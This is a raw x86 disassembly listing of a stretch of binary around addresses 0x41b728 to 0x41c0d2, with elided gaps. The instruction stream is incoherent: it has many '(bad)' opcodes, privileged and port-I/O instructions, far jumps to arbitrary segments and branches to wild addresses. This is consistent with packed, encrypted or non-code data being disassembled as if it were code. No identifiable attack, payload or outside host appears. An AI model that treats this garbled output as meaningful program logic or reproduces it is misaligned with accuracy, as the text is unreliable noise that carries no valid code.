  41b728:	xchg   BYTE PTR gs:[ebp+0x6f],bl
  41b72c:	mov    bl,0x19
  41b72e:	aad    0x97
  41b730:	inc    ebx
  41b731:	popa   
  41b732:	or     al,0x3e
  41b734:	xchg   edx,eax
  41b735:	mov    DWORD PTR [eax+0x1d640563],edx
  41b73b:	rcr    esp,cl
  41b73d:	pop    ebx
  41b73e:	aam    0x14
  41b740:	push   0xffffffe6
  41b742:	outs   dx,DWORD PTR ds:[esi]
  41b743:	inc    ebp
  41b744:	loope  0x41b757
  41b746:	xlat   BYTE PTR ds:[ebx]
  41b747:	cmp    cl,BYTE PTR [edi+0x160bc472]
  41b74d:	aad    0xdd
  41b74f:	inc    eax
  41b750:	jb     0x1d05e6c6
  41b756:	jo     0x41b79b
  41b758:	mov    al,ds:0x6e63a368
  41b75d:	mov    ch,0x68
  41b75f:	les    ebp,FWORD PTR [eax-0xb075752]
  41b765:	cli    
  41b766:	dec    ebx
  41b767:	hlt    
  41b768:	sub    esp,DWORD PTR [eax-0x42]
  41b76b:	jge    0x41b714
  41b76d:	outs   dx,BYTE PTR ds:[esi]
  41b76e:	push   0xe1462496
  41b773:	mov    ebx,0x91513717
  41b778:	jl     0x41b7d7
  41b77a:	mov    ebx,DWORD PTR [eax]
  41b77c:	jecxz  0x41b782
  41b77e:	shl    DWORD PTR [edx],cl
  41b780:	fidiv  DWORD PTR [ebp-0x36adaba0]
  41b786:	jecxz  0x41b79f
  41b788:	adc    eax,0x8207a681
  41b78d:	mov    eax,0xc9c195e4
  41b792:	test   DWORD PTR [eax],esp
  41b794:	sbb    ah,BYTE PTR [ecx]
  41b796:	loope  0x41b815
  41b798:	xor    DWORD PTR [esi-0x7b],ecx
  41b79b:	and    cl,bh
  41b79d:	xchg   ecx,eax
  41b79e:	push   edi
  41b79f:	pop    edx
  41b7a0:	mov    ebx,0x775db802
  41b7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7a6:	or     al,0x4f
  41b7a8:	sbb    eax,0xaa435f70
  41b7ad:	mov    ebp,0x96bdc217
  41b7b2:	test   al,0xf4
  41b7b4:	xchg   edi,eax
  41b7b5:	mov    bl,0xa7
  41b7b7:	inc    ecx
  41b7b8:	dec    ecx
  41b7b9:	push   ecx
  41b7ba:	pop    edx
  41b7bb:	stc    
  41b7bc:	mov    dh,0xe
  41b7be:	mov    esp,eax
  41b7c0:	mov    ch,0x28
  41b7c2:	icebp  
  41b7c3:	test   al,0x3
  41b7c5:	adc    edi,DWORD PTR [ecx-0x1f]
  41b7c8:	inc    ecx
  41b7c9:	jns    0x41b811
  41b7cb:	cmp    al,0x26
  41b7cd:	ror    BYTE PTR [edx],1
  41b7cf:	push   es
  41b7d0:	xchg   esi,eax
  41b7d1:	inc    edx
  41b7d2:	inc    esi
  41b7d3:	sub    ch,dl
  41b7d5:	add    DWORD PTR [edi],eax
  41b7d7:	(bad)  
  41b7d8:	mov    ebp,0xde893ec2
  41b7dd:	dec    ecx
  41b7de:	jecxz  0x41b842
  41b7e0:	(bad)  
  41b7e1:	and    eax,0x88c33d12
  41b7e6:	mov    ebx,DWORD PTR [ebp-0x48]
  41b7e9:	and    al,0x96
  41b7eb:	mov    DWORD PTR [eax-0x3f],ecx
  41b7ee:	sbb    DWORD PTR [edx-0x5a],ebx
  41b7f1:	jecxz  0x41b814
  41b7f3:	pop    ecx
  41b7f4:	inc    ebx
  41b7f5:	cmp    dl,BYTE PTR [ecx+0x5f170a62]
  41b7fb:	sub    ch,BYTE PTR [edx+0x21]
  41b7fe:	bound  esp,QWORD PTR [ebx]
  41b800:	push   ebx
  41b801:	data16 (bad) 
  41b803:	bound  ecx,QWORD PTR cs:[ebp+0x703f8c47]
  41b80a:	mov    bl,0xae
  41b80c:	adc    bl,dl
  41b80e:	ror    BYTE PTR [ebx],1
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x70
  41b881:	in     eax,0x52
  41b883:	scas   al,BYTE PTR es:[edi]
  41b884:	and    BYTE PTR [ecx+eax*1],ah
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	mov    al,ds:0xa636d7aa
  41b891:	mov    al,0x8
  41b893:	mov    cl,0x7f
  41b895:	call   0x9d4e0dea
  41b89a:	mov    ah,0x10
  41b89c:	test   DWORD PTR [eax],0x67daac5e
  41b8a2:	stos   DWORD PTR es:[edi],eax
  41b8a3:	dec    esp
  41b8a4:	jmp    0x5faa:0x5d382b0f
  41b8ab:	fnsave [esp+ebp*8]
  41b8ae:	dec    edi
  41b8af:	iret   
  41b8b0:	arpl   WORD PTR [esi+ebx*2],cx
  41b8b3:	int    0x6
  41b8b5:	adc    DWORD PTR [edi+esi*1+0x4d3c5b80],esi
  41b8bc:	repnz (bad) 
  41b8be:	fstp   st(6)
  41b8c0:	out    dx,eax
  41b8c1:	inc    eax
  41b8c2:	and    DWORD PTR [edx+0x2da97a44],edi
  41b8c8:	test   al,0xaf
  41b8ca:	dec    ebp
  41b8cb:	imul   ebx,DWORD PTR [edx-0x3c],0x75d74ec3
  41b8d2:	cmp    dl,BYTE PTR [ecx-0x7eb6ce53]
  41b8d8:	mov    ah,0xed
  41b8da:	sub    esp,ecx
  41b8dc:	xor    BYTE PTR [ebp-0x6884a1f2],ch
  41b8e2:	pop    edi
  41b8e3:	or     bh,bl
  41b8e5:	mov    cl,0x83
  41b8e7:	imul   ebx,DWORD PTR [ebx+0x7a],0xad4d01
  41b8ee:	not    BYTE PTR [ebx+0x67]
  41b8f1:	test   DWORD PTR [ecx+edi*2+0x1f],edx
  41b8f5:	xchg   BYTE PTR [edi-0x5],dl
  41b8f8:	(bad)  
  41b8f9:	int3   
  41b8fa:	dec    esi
  41b8fb:	nop
  41b8fc:	pop    edi
  41b8fd:	(bad)  
  41b8fe:	stc    
  41b8ff:	add    eax,0x656b413d
  41b904:	mov    ah,0xc5
  41b906:	shl    DWORD PTR [ebx+esi*2+0x4f],0x2b
  41b90b:	jmp    0x41b909
  41b90d:	cld    
  41b90e:	mov    bl,0xf2
  41b910:	pop    ecx
  41b911:	popa   
  41b912:	sbb    al,0x3b
  41b914:	sbb    ecx,DWORD PTR [ecx-0x449c6b14]
  41b91a:	pop    ds
  41b91b:	xor    cl,BYTE PTR [ebp-0x3e8ce245]
  41b921:	popa   
  41b922:	wbinvd 
  41b924:	fsub   DWORD PTR [eax]
  41b926:	loop   0x41b8dc
  41b928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b929:	cwde   
  41b92a:	push   esp
  41b92b:	xor    edi,DWORD PTR ds:0xde52588c
  41b931:	mov    edi,0xe80625d2
  41b936:	mov    ds:0x9cf286a7,eax
  41b93b:	pop    edi
  41b93c:	xor    al,0xde
  41b93e:	mov    ebp,DWORD PTR [edi+ebp*1]
  41b941:	stc    
  41b942:	jb     0x41b9b6
  41b944:	sbb    BYTE PTR ds:0x3a706da7,dh
  41b94a:	mov    esp,0xfa8c92e1
  41b94f:	mov    bh,BYTE PTR [ebp-0x17c79deb]
  41b955:	lahf   
  41b956:	test   edx,esi
  41b958:	xor    BYTE PTR [esi+0x5],al
  41b95b:	xchg   ecx,eax
  41b95c:	aas    
  41b95d:	mov    bl,0xea
  41b95f:	jl     0x41b8e3
  41b961:	inc    ebx
  41b962:	and    DWORD PTR [edi-0x2855abf1],edx
  41b968:	mov    edx,0xf205169b
  41b96d:	cmp    eax,DWORD PTR [eax]
  41b96f:	push   ds
  41b970:	push   ebx
  41b971:	mov    ds:0x6b990d12,al
  41b976:	iret   
  41b977:	scas   al,BYTE PTR es:[edi]
  41b978:	adc    DWORD PTR [ebp+esi*2-0x3d],eax
  41b97c:	(bad)  
  41b97d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b97e:	push   edx
  41b97f:	call   0xc557:0x3659adfe
  41b986:	fistp  WORD PTR [ebx+ecx*4+0x73852d6b]
  41b98d:	int    0xe
  41b98f:	repz add BYTE PTR [eax],al
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	jbe    0x41ba1d
  41ba02:	aam    0xe6
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	sbb    ebx,DWORD PTR [edi]
  41ba0e:	sub    DWORD PTR [edi],ecx
  41ba10:	mov    al,0x65
  41ba12:	stos   BYTE PTR es:[edi],al
  41ba13:	cli    
  41ba14:	jge    0x41b9ef
  41ba16:	pushf  
  41ba17:	enter  0xd7e1,0x27
  41ba1b:	xchg   esp,eax
  41ba1c:	pushf  
  41ba1d:	stos   BYTE PTR es:[edi],al
  41ba1e:	jecxz  0x41b9cf
  41ba20:	xchg   esi,eax
  41ba21:	(bad)  
  41ba22:	in     al,dx
  41ba23:	and    eax,0x7441a747
  41ba28:	mov    ecx,ss
  41ba2a:	or     DWORD PTR [edi+0x237b272e],ecx
  41ba30:	sub    eax,0xadc74916
  41ba35:	and    bl,ch
  41ba37:	sbb    BYTE PTR [edi+0x2f],dl
  41ba3a:	inc    ecx
  41ba3b:	jmp    0x8f2ff71
  41ba40:	popa   
  41ba41:	and    eax,0x38d26570
  41ba46:	pop    ecx
  41ba47:	dec    esi
  41ba48:	dec    ecx
  41ba49:	mov    BYTE PTR [eax+0x73347edd],dl
  41ba4f:	cmp    DWORD PTR [ebp-0x2c],esi
  41ba52:	jle    0x41ba5e
  41ba54:	inc    BYTE PTR [esi-0x66736414]
  41ba5a:	add    al,0xcc
  41ba5c:	mov    edi,0xf95c4043
  41ba61:	adc    edx,edi
  41ba63:	cld    
  41ba64:	pop    esp
  41ba65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba66:	int    0x56
  41ba68:	cmp    BYTE PTR [edx+0x11581279],dh
  41ba6e:	scas   al,BYTE PTR es:[edi]
  41ba6f:	and    al,ah
  41ba71:	ja     0x41ba7b
  41ba73:	das    
  41ba74:	mov    DWORD PTR [ebx-0x42],ecx
  41ba77:	pushf  
  41ba78:	inc    ebp
  41ba79:	test   eax,0x5c84634
  41ba7e:	in     eax,dx
  41ba7f:	retf   0x1a92
  41ba82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba84:	and    DWORD PTR [esi-0x2e730910],esp
  41ba8a:	retf   
  41ba8b:	adc    eax,0xf33657cb
  41ba90:	lea    esp,[ebx]
  41ba92:	xor    bh,cl
  41ba94:	add    edi,edx
  41ba96:	fdiv   DWORD PTR [ebx-0x1a9a175d]
  41ba9c:	lock push ds
  41ba9e:	out    0xad,al
  41baa0:	pusha  
  41baa1:	out    0x0,eax
  41baa3:	popa   
  41baa4:	into   
  41baa5:	nop
  41baa6:	mov    ebx,0xee74ab68
  41baab:	mov    ah,0xb5
  41baad:	ins    BYTE PTR es:[edi],dx
  41baae:	sub    BYTE PTR [edi-0x6ba48363],al
  41bab4:	sbb    DWORD PTR [ecx+0x45],ecx
  41bab7:	push   esp
  41bab8:	adc    DWORD PTR [edi+0x5310ca5d],0xa8b5a583
  41bac2:	sbb    bl,BYTE PTR [ebx+0x47]
  41bac5:	clc    
  41bac6:	jp     0x41baeb
  41bac8:	sub    edx,ebp
  41baca:	mov    edx,0x16dc44c7
  41bacf:	test   BYTE PTR [eax+0x1a],dh
  41bad2:	out    dx,al
  41bad3:	mov    ds:0xcfa87699,eax
  41bad8:	pop    ebp
  41bad9:	inc    ebp
  41bada:	mov    DWORD PTR [eax],esi
  41badc:	sub    DWORD PTR [esi-0x12],edi
  41badf:	add    al,0x5f
  41bae1:	popf   
  41bae2:	(bad)
  41bae5:	sbb    DWORD PTR [ebx*4+0x637f3fcf],0xa9f30736
  41baf0:	outs   dx,BYTE PTR ds:[esi]
  41baf1:	(bad)  
  41baf2:	repnz into 
  41baf4:	dec    ecx
  41baf5:	inc    edx
  41baf6:	shl    BYTE PTR [edi+0x40788d57],1
  41bafc:	sbb    DWORD PTR [ecx],ebp
  41bafe:	fldcw  WORD PTR [ebx]
  41bb00:	sub    esp,DWORD PTR [edx-0x13]
  41bb03:	adc    BYTE PTR [ecx+0x72],cl
  41bb06:	in     al,0x31
  41bb08:	nop
  41bb09:	push   esi
  41bb0a:	dec    edx
  41bb0b:	pop    ebx
  41bb0c:	add    BYTE PTR [esi+0xf14c],0x0
	...
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x37],cx
  41bb81:	lea    esi,[edx]
  41bb83:	mov    ah,0x28
  41bb85:	add    DWORD PTR es:[eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	loop   0x41bb9e
  41bb8e:	lahf   
  41bb8f:	pop    es
  41bb90:	jl     0x41bbb2
  41bb92:	ins    DWORD PTR es:[edi],dx
  41bb93:	jmp    0x41b737e
  41bb98:	xchg   ecx,eax
  41bb99:	and    al,0x39
  41bb9b:	sar    DWORD PTR [esi+edx*4],1
  41bb9e:	int    0x5e
  41bba0:	lods   eax,DWORD PTR ds:[esi]
  41bba1:	or     cl,BYTE PTR [esp+esi*4]
  41bba4:	mov    ds:0x56c04f13,al
  41bba9:	sub    dh,BYTE PTR ds:0x6fbb818e
  41bbaf:	xor    al,BYTE PTR [ecx+esi*2]
  41bbb2:	cdq    
  41bbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbb4:	xor    eax,0x706c68ff
  41bbb9:	call   0xc149:0xd440d670
  41bbc0:	loope  0x41bb5c
  41bbc2:	inc    esp
  41bbc3:	std    
  41bbc4:	daa    
  41bbc5:	test   ecx,0x9d1a9107
  41bbcb:	lahf   
  41bbcc:	aad    0xee
  41bbce:	scas   eax,DWORD PTR es:[edi]
  41bbcf:	pushf  
  41bbd0:	jo     0x41bbf3
  41bbd2:	jnp    0x41bc36
  41bbd4:	sahf   
  41bbd5:	(bad)  
  41bbd6:	fdivr  st(5),st
  41bbd8:	adc    DWORD PTR [eax+0x48],edx
  41bbdb:	int    0x35
  41bbdd:	jnp    0x41bb94
  41bbdf:	mov    esi,0x649681d6
  41bbe4:	push   ecx
  41bbe5:	jmp    0xf09ae7d0
  41bbea:	and    bl,BYTE PTR [esi-0x1e]
  41bbed:	jmp    0xc7b9:0xf353e6ea
  41bbf4:	ret    0x51b
  41bbf7:	sub    al,BYTE PTR [ecx+0x4]
  41bbfa:	imul   ecx,edx,0x743499bf
  41bc00:	jecxz  0x41bbd7
  41bc02:	mov    bl,0x47
  41bc04:	or     esi,ebx
  41bc06:	cwde   
  41bc07:	daa    
  41bc08:	inc    edx
  41bc09:	push   es
  41bc0a:	xchg   BYTE PTR [edi-0x66a35569],dl
  41bc10:	dec    esp
  41bc11:	loop   0x41bbfa
  41bc13:	cmp    BYTE PTR [ecx-0x795117c4],al
  41bc19:	jae    0x41bc36
  41bc1b:	leave  
  41bc1c:	mov    edx,gs
  41bc1e:	sar    edx,0x11
  41bc21:	mov    DWORD PTR fs:[edi+0x41],0xa709acab
  41bc29:	mov    ebx,?
  41bc2b:	mov    cl,0x6b
  41bc2d:	inc    esp
  41bc2e:	xchg   esp,ecx
  41bc30:	js     0x41bc82
  41bc32:	xor    eax,0xc22fa6b7
  41bc37:	(bad)  
  41bc38:	sbb    DWORD PTR [ebx],ebp
  41bc3a:	je     0x41bc71
  41bc3c:	adc    DWORD PTR [ebx],esi
  41bc3e:	push   0xffffff89
  41bc40:	jns    0x41bca8
  41bc42:	stos   BYTE PTR es:[edi],al
  41bc43:	sbb    BYTE PTR [ecx-0x7e7399e8],bl
  41bc49:	cmp    al,0xd3
  41bc4b:	pushf  
  41bc4c:	inc    ecx
  41bc4d:	jmp    0x41bcac
  41bc4f:	lds    esi,FWORD PTR [ebp+eax*2+0x2ecabeff]
  41bc56:	sub    cl,BYTE PTR ss:[eax+0x4dbdf09a]
  41bc5d:	jae    0x41bbe5
  41bc5f:	inc    esi
  41bc60:	(bad)  gs:[eax+0x69]
  41bc64:	loopne 0x41bc42
  41bc66:	in     eax,dx
  41bc67:	dec    edi
  41bc68:	and    eax,esi
  41bc6a:	stos   DWORD PTR es:[edi],eax
  41bc6b:	push   ebp
  41bc6c:	xchg   edx,eax
  41bc6d:	jno    0x41bce4
  41bc6f:	or     al,0x2d
  41bc71:	jbe    0x41bc83
  41bc73:	test   DWORD PTR [esi],ecx
  41bc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc76:	lock mov al,0x85
  41bc79:	xor    al,BYTE PTR [esi+esi*1+0x4]
  41bc7d:	adc    al,bl
  41bc7f:	scas   al,BYTE PTR es:[edi]
  41bc80:	jl     0x41bc40
  41bc82:	call   0xd3c0a03f
  41bc87:	jmp    0xf73f6557
  41bc8c:	or     dh,BYTE PTR [edi+edi*2+0x6f]
	...
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x748dd9d8
  41bd02:	mov    edx,0x1272cf1
  41bd07:	add    BYTE PTR [ecx+eax*1],al
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	pop    ebp
  41bd0d:	sub    DWORD PTR [ecx-0x7fb161c0],ebp
  41bd13:	ins    DWORD PTR es:[edi],dx
  41bd14:	nop
  41bd15:	test   ch,cl
  41bd17:	jmp    0x41bd7d
  41bd19:	dec    edx
  41bd1a:	outs   dx,BYTE PTR ds:[esi]
  41bd1b:	add    DWORD PTR [edi],edi
  41bd1d:	in     eax,0xba
  41bd1f:	jge    0x41bd2a
  41bd21:	cmp    BYTE PTR [ecx+ebp*2-0x7f],ch
  41bd25:	fucom  st(5)
  41bd27:	sysenter 
  41bd29:	xor    BYTE PTR [edi],dl
  41bd2b:	push   ss
  41bd2c:	add    al,0x92
  41bd2e:	or     BYTE PTR [esi+0x34f0aa7f],al
  41bd34:	repnz rol BYTE PTR [ebp+0x7821848f],cl
  41bd3b:	das    
  41bd3c:	jbe    0x41bd58
  41bd3e:	mov    DWORD PTR [ecx],ebx
  41bd40:	xor    ebp,DWORD PTR [edi+0x6bd1fb33]
  41bd46:	cmp    eax,0x181080a3
  41bd4b:	adc    eax,DWORD PTR ds:0xa120a165
  41bd51:	cli    
  41bd52:	popf   
  41bd53:	sbb    DWORD PTR [ebx+0x74d3d7f7],0x883f8e2a
  41bd5d:	iret   
  41bd5e:	cmp    DWORD PTR [edi],ecx
  41bd60:	pop    edi
  41bd61:	lds    edi,FWORD PTR [edx+0x1b01d52]
  41bd67:	mov    ds:0xcc8635bc,al
  41bd6d:	loopne 0x41bd7e
  41bd6f:	rol    edx,1
  41bd71:	jmp    0x44c1:0x563d13b9
  41bd78:	pop    ebx
  41bd79:	push   esp
  41bd7a:	sub    bl,al
  41bd7c:	hlt    
  41bd7d:	popa   
  41bd7e:	xor    ebp,esi
  41bd80:	adc    BYTE PTR [eax-0x3db23317],ah
  41bd86:	icebp  
  41bd87:	or     ch,bl
  41bd89:	push   eax
  41bd8a:	into   
  41bd8b:	pop    edi
  41bd8c:	ret    0x93c5
  41bd8f:	mov    cl,0x80
  41bd91:	jbe    0x41bda3
  41bd93:	add    ch,BYTE PTR [edi]
  41bd95:	cwde   
  41bd96:	test   DWORD PTR [edi],0x43a585c9
  41bd9c:	aaa    
  41bd9d:	sbb    ch,bl
  41bd9f:	fwait
  41bda0:	stc    
  41bda1:	cld    
  41bda2:	inc    edi
  41bda3:	mov    dh,0x17
  41bda5:	sbb    eax,0x57ba9e58
  41bdaa:	push   ebp
  41bdab:	mov    al,ds:0x29f766e3
  41bdb0:	aas    
  41bdb1:	cwde   
  41bdb2:	mov    ah,0x1e
  41bdb4:	imul   edx,DWORD PTR [edx+0x6f],0x66d823e8
  41bdbb:	mov    dl,0xf3
  41bdbd:	imul   ecx,DWORD PTR [esp+eax*8+0x38f451a6],0x99c7c844
  41bdc8:	pushf  
  41bdc9:	icebp  
  41bdca:	leave  
  41bdcb:	xor    BYTE PTR [esi+0x1ddee7d],dh
  41bdd1:	data16 cli 
  41bdd3:	test   eax,0x46c9cfcf
  41bdd8:	shr    DWORD PTR ds:0x86ebd075,1
  41bdde:	mov    bl,0x8c
  41bde0:	xchg   ecx,eax
  41bde1:	add    BYTE PTR [ecx+0xdccbe25],ah
  41bde7:	clc    
  41bde8:	push   ebx
  41bde9:	mov    ds:0x70921737,al
  41bdee:	mov    edi,0x7c97427a
  41bdf3:	add    eax,0x8f13696
  41bdf8:	push   ebp
  41bdf9:	and    dh,BYTE PTR [esi]
  41bdfb:	mov    ch,0x24
  41bdfd:	cli    
  41bdfe:	je     0x41be2d
  41be00:	or     dl,BYTE PTR [eax]
  41be02:	xchg   esp,eax
  41be03:	sub    dh,BYTE PTR [ebx-0xa]
  41be06:	jns    0x41bdd7
  41be08:	jecxz  0x41bd9b
  41be0a:	push   es
  41be0b:	sbb    DWORD PTR ds:0x5bb830,eax
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x49e03f66]
  41be82:	cmp    BYTE PTR [eax+0x12830],0x4
  41be89:	add    DWORD PTR [eax],eax
  41be8b:	add    BYTE PTR [eax+ecx*1],cl
  41be8e:	in     eax,0xfe
  41be90:	mov    WORD PTR [esi+0x4c],ds
  41be93:	in     al,0x85
  41be95:	and    bl,dh
  41be97:	dec    ebp
  41be98:	jne    0x41be73
  41be9a:	fwait
  41be9b:	mov    ecx,0x9d111c23
  41bea0:	pop    esp
  41bea1:	enter  0xb049,0xf7
  41bea5:	mov    DWORD PTR [esi+0x5797cb2d],ebp
  41beab:	stos   BYTE PTR es:[edi],al
  41beac:	outs   dx,DWORD PTR ds:[esi]
  41bead:	push   ebx
  41beae:	cli    
  41beaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beb0:	loopne 0x41bf11
  41beb2:	cdq    
  41beb3:	xlat   BYTE PTR ds:[ebx]
  41beb4:	inc    ecx
  41beb5:	adc    ch,BYTE PTR [ebx]
  41beb7:	push   ecx
  41beb8:	imul   ebp,DWORD PTR [edi+ecx*8+0x7b4b3cfb],0x69
  41bec0:	hlt    
  41bec1:	push   ebx
  41bec2:	ins    BYTE PTR es:[edi],dx
  41bec3:	push   0x25
  41bec5:	push   0xffffffa7
  41bec7:	out    0x1d,al
  41bec9:	dec    ebp
  41beca:	les    eax,FWORD PTR [ebx-0x34]
  41becd:	out    0x98,eax
  41becf:	mov    eax,ds:0xf858c02
  41bed4:	mov    ah,0x74
  41bed6:	fisubr DWORD PTR [eax+0x74]
  41bed9:	inc    ecx
  41beda:	inc    edx
  41bedb:	push   ds
  41bedc:	adc    BYTE PTR [eax+ebx*4],dh
  41bedf:	test   BYTE PTR [ecx+0x618e08db],dh
  41bee5:	push   ebx
  41bee6:	and    BYTE PTR [esi-0x6b41ade],dh
  41beec:	and    eax,0xcbb9a23e
  41bef1:	std    
  41bef2:	lods   al,BYTE PTR ds:[esi]
  41bef3:	arpl   di,bp
  41bef5:	mov    ah,0x18
  41bef7:	or     eax,0xd0a085f1
  41befc:	push   0x76
  41befe:	test   DWORD PTR [edx-0x55227568],edx
  41bf04:	cld    
  41bf05:	xor    BYTE PTR [ebp-0x51],ah
  41bf08:	xchg   esi,eax
  41bf09:	(bad)  
  41bf0a:	stc    
  41bf0b:	rol    DWORD PTR [ebx],cl
  41bf0d:	dec    esp
  41bf0e:	idiv   BYTE PTR [edx-0x19093ec0]
  41bf14:	cmp    al,0x59
  41bf16:	jp     0x41bf64
  41bf18:	in     eax,0x84
  41bf1a:	xor    BYTE PTR [ebx+0x78],0x56
  41bf1e:	push   ebx
  41bf1f:	pop    eax
  41bf20:	push   esp
  41bf21:	sub    ebx,DWORD PTR [edi+ecx*8-0x1e0b4fdd]
  41bf28:	lahf   
  41bf29:	popf   
  41bf2a:	push   0xffffffaa
  41bf2c:	mov    edi,0x470fcf05
  41bf31:	repnz push ds
  41bf33:	mov    gs,ebx
  41bf35:	sub    DWORD PTR [ecx+eax*4-0x17],ebx
  41bf39:	leave  
  41bf3a:	dec    edx
  41bf3b:	jge    0x41bf4a
  41bf3d:	fs adc bl,ch
  41bf40:	adc    esi,DWORD PTR [edi-0x61]
  41bf43:	push   es
  41bf44:	div    DWORD PTR [edx+0x1a]
  41bf47:	out    0xb7,eax
  41bf49:	in     al,0x38
  41bf4b:	xchg   esi,eax
  41bf4c:	push   edx
  41bf4d:	jne    0x41bee4
  41bf4f:	pop    DWORD PTR [ecx]
  41bf51:	pop    ebp
  41bf52:	xor    ebp,edi
  41bf54:	sbb    edi,DWORD PTR [ebx+esi*8+0x4f]
  41bf58:	sbb    DWORD PTR [ebx],ecx
  41bf5a:	inc    ebp
  41bf5b:	and    DWORD PTR [ebx+ecx*1],ebx
  41bf5e:	cmp    DWORD PTR [ebx-0x3645bcb0],edx
  41bf64:	pop    es
  41bf65:	ins    BYTE PTR es:[edi],dx
  41bf66:	cwde   
  41bf67:	cdq    
  41bf68:	rcl    dl,0x2b
  41bf6b:	mov    ebp,0x34f4ed5
  41bf70:	or     DWORD PTR [ebx*8-0x40297656],esp
  41bf77:	in     al,dx
  41bf78:	fstp   QWORD PTR [ebp-0x6aa8b75e]
  41bf7e:	dec    esp
  41bf7f:	fld    DWORD PTR [edx-0x790b6ca7]
  41bf85:	cli    
  41bf86:	xchg   edx,eax
  41bf87:	cmp    dh,dh
  41bf89:	test   DWORD PTR [ebp+0x26b35efc],edi
  41bf8f:	std    
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	leave  
  41c001:	xchg   ecx,eax
  41c002:	pop    ss
  41c003:	xor    DWORD PTR [ecx+ebp*1],0x1
  41c007:	add    BYTE PTR [ecx+eax*1],al
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	sub    BYTE PTR [ecx],ch
  41c00e:	adc    ah,BYTE PTR [ebx-0x718885f2]
  41c014:	push   edi
  41c015:	mov    ah,0x8b
  41c017:	test   DWORD PTR [edx-0x1f4daec7],eax
  41c01d:	mov    ah,0xc
  41c01f:	jp     0x41c092
  41c021:	push   ebx
  41c022:	mov    eax,0x80c562ce
  41c027:	ins    DWORD PTR es:[edi],dx
  41c028:	(bad)  
  41c029:	push   edi
  41c02a:	add    bh,0x39
  41c02d:	test   eax,0xf921fae0
  41c032:	push   0x50
  41c034:	inc    ebx
  41c035:	inc    edx
  41c036:	enter  0x1ca,0xe
  41c03a:	das    
  41c03b:	loope  0x41c060
  41c03d:	pop    esp
  41c03e:	fwait
  41c03f:	aam    0x38
  41c041:	push   ss
  41c042:	jge    0x41c082
  41c044:	adc    DWORD PTR [edx-0x49a4d907],edi
  41c04a:	xchg   ecx,eax
  41c04b:	les    ecx,FWORD PTR [ebp-0xb]
  41c04e:	test   BYTE PTR [ebx-0x6ba433c5],cl
  41c054:	lahf   
  41c055:	imul   eax,DWORD PTR [edi+0x7c],0x5368cf72
  41c05c:	retf   
  41c05d:	pop    esi
  41c05e:	(bad)
  41c062:	les    esp,FWORD PTR [edx-0xe940ace]
  41c068:	pushf  
  41c069:	mov    dh,0x65
  41c06b:	mov    eax,0xcd933135
  41c070:	add    bl,BYTE PTR [ebp+0x61e6fb6c]
  41c076:	(bad)  
  41c077:	pop    edi
  41c078:	adc    eax,DWORD PTR [ecx-0x3f]
  41c07b:	fucom  st(1)
  41c07d:	out    dx,eax
  41c07e:	mov    gs,WORD PTR [ebp-0x18]
  41c081:	out    dx,eax
  41c082:	dec    esi
  41c083:	add    eax,0x8afede4
  41c088:	pop    esp
  41c089:	xor    al,0x6b
  41c08b:	(bad)  
  41c08c:	hlt    
  41c08d:	mov    al,0x96
  41c08f:	push   ds
  41c090:	cmc    
  41c091:	jg     0x41c0ba
  41c093:	pusha  
  41c094:	int3   
  41c095:	out    dx,eax
  41c096:	jbe    0x41c0ae
  41c098:	es daa 
  41c09a:	inc    ebp
  41c09b:	xor    eax,0xe9b2b3ee
  41c0a0:	fsubr  DWORD PTR [ebp+0x15225658]
  41c0a6:	jnp    0x41c0e9
  41c0a8:	jle    0x41c09c
  41c0aa:	loop   0x41c096
  41c0ac:	jno    0x41c0cf
  41c0ae:	out    dx,al
  41c0af:	out    dx,eax
  41c0b0:	add    DWORD PTR [edi+0x56],ebp
  41c0b3:	dec    edx
  41c0b4:	push   edi
  41c0b5:	xor    BYTE PTR [esi-0x30],cl
  41c0b8:	in     eax,dx
  41c0b9:	dec    ebx
  41c0ba:	out    dx,al
  41c0bb:	jno    0x41c13b
  41c0bd:	cmp    al,0x77
  41c0bf:	(bad)  
  41c0c0:	int    0xdd
  41c0c2:	into   
  41c0c3:	ret    
  41c0c4:	add    DWORD PTR [edx-0x783c31e6],eax
  41c0ca:	call   0x3775486a
  41c0cf:	ins    BYTE PTR es:[edi],dx
  41c0d0:	jg     0x41c0f3
  41c0d2:	jae    0x41c147
